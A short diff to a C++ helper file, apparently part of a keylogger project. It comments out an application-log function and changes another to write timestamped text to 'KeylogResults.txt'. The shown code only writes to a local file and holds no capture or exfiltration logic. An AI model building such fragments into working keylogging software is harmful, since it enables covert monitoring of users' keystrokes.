@@ -54,15 +54,15 @@ namespace Helper {
         return s.str();
     }
 
-    void WriteAppLog(const std::string &s){
+    /*void WriteAppLog(const std::string &s){
         std::ofstream file("AppLog.txt", std::ios::app);
         file << "[" << Helper::DateTime().GetDateTimeString() << "]" << "\n" << s << std::endl << "\n";
         file.close();
-    }
+    }*/
 
-    void WriteTestLog(const std::string &s){
+    void WriteBody(const std::string &s){
         std::ofstream file("KeylogResults.txt");
-        file << s << std::endl << "\n";
+        file << "[" << Helper::DateTime().GetDateTimeString() << "]" << "\n" << s << std::endl << "\n";
         file.close();
     }
 }
